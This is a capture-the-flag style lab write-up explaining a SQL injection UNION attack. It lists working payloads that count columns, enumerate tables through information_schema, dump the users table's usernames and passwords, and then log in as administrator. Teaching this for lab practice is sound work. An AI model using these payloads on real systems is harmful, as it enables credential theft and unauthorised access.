Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the **_WHERE_** clause.
- The database contains a table called _**users**_ with the columns _**username**_ and _**password**_.

In this example, we can retrieve the contents of the users table by submitting the input:<br>
``' UNION SELECT username, password FROM users--``

In order to perform this attack, we need to know that there is a table called users with two columns called username and password. 

**<h2>Problem:</h2>**
The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

**<h2>Solution:</h2>**
- Check for the number of columns using `` order by`` attack; which gives us columns 2.
- Check the data type in each columns using UNION attack; ``' union select 'a',NULL--``
; Gives response for text for both table with query ``' union select 'a','aaa'--``
- Now check for the tables using ``' union select table_name,NULL from information_schema.tables--`` returns a **users** table. 
- Check the columns present in the **users** table using query ``'union select column_name, NULL from information_schema.columns where table_name='users'--``
- Now check for columns username and password in users table using ``' union select username,password from users--``
![alt text](/images/lab9credentials.png)
- Now login with the credentials to solve the lab.